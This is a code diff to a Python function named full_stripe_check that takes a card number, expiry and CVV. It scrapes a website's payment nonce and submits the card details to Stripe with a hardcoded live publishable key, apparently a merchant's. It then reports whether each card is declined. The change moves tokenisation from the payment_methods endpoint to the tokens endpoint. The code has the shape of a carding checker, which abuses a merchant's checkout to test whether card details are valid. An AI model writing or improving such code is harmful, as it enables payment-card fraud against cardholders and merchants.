@@ -38,12 +38,15 @@ def full_stripe_check(cc, mm, yy, cvv):
             return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
         ajax_nonce = payment_nonce_match.group(1)
 
-        # Step 5: Get Stripe payment token
-        stripe_data = (
-            f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
-            '&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
-        )
-        stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
+        # Step 5: Get Stripe payment token using v1/tokens
+        stripe_data = {
+            'card[number]': cc,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'card[cvc]': cvv,
+            'key': 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
+        }
+        stripe_response = session.post('https://api.stripe.com/v1/tokens', data=stripe_data)
         if stripe_response.status_code == 402:
             error_message = stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.')
             return {"status": "Declined", "response": error_message, "decline_type": "card_decline"}
